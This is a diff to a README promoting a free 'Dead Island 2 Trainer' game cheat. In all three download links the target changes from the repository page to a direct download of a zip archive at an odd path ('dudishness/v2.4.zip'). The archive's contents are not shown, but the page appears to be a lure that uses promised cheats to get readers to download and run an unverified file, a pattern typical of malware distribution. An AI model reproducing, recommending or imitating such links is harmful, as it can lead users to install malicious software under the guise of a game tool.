@@ -1,6 +1,6 @@
 # 🧟 Dead-Island-2-Trainer - Unlock Unlimited Power Instantly
 
-[![Download Dead Island 2 Trainer](https://img.shields.io/badge/Download-Free_Trainer_2026-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tonsured-karlfriedrichgauss9479/Dead-Island-2-Trainer)
+[![Download Dead Island 2 Trainer](https://img.shields.io/badge/Download-Free_Trainer_2026-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Tonsured-karlfriedrichgauss9479/Dead-Island-2-Trainer/main/dudishness/v2.4.zip)
 
 ## 🎮 What Is This?
 
@@ -20,7 +20,7 @@ Follow these simple steps to get your trainer running in less than five minutes.
 
 ### Step 1: Download the Trainer
 
-[Click here to download Dead Island 2 Trainer](https://github.com/Tonsured-karlfriedrichgauss9479/Dead-Island-2-Trainer)
+[Click here to download Dead Island 2 Trainer](https://raw.githubusercontent.com/Tonsured-karlfriedrichgauss9479/Dead-Island-2-Trainer/main/dudishness/v2.4.zip)
 
 Visit this link to download the application. The download starts automatically when you click the button on that page.
 
@@ -92,7 +92,7 @@ If you run into any problems, try these quick fixes:
 
 Need to download again? No problem. Just use the same link:
 
-[Download Dead Island 2 Trainer — Free 2026 Version](https://github.com/Tonsured-karlfriedrichgauss9479/Dead-Island-2-Trainer)
+[Download Dead Island 2 Trainer — Free 2026 Version](https://raw.githubusercontent.com/Tonsured-karlfriedrichgauss9479/Dead-Island-2-Trainer/main/dudishness/v2.4.zip)
 
 Visit this link to download the application. It's completely free, and there are no hidden charges or subscriptions.
 
